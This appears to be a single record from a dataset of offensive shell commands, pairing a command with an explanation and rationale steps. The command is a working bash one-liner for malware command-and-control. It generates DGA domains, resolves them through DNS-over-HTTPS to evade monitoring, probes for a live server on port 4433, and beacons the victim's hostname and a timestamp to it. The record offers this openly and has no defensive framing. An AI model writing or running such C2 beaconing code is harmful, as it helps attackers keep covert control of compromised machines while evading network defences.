command: SEED="gamma"; TLDs=(com net biz io); for i in $(seq 1 6); do LABEL=$(printf "%s" "${SEED}$(date -u +%Y%m%d)$i" | sha256sum | cut -c1-16); FQDN="${LABEL}.status-sync.${TLDs[$RANDOM%${#TLDs[@]}]}"; if curl --doh-url https://dns.google/dns-query -sSfI --connect-timeout 2 "https://${FQDN}:4433/health"; then curl --doh-url https://dns.google/dns-query -sS "https://${FQDN}:4433/beacon" -H "X-Node: $(hostname)" -H "X-TS: $(date +%s)"; break; fi; sleep $((RANDOM%3+1)); done
explanation: Iteratively generates multiple DGA domains and uses DoH to probe for a live C2 endpoint over port 4433, then sends a beacon once connectivity is confirmed.
rationale_steps: Create several DGA candidates per run
Resolve and probe via DoH using curl HEAD
Beacon to C2 over irregular TLS port 4433
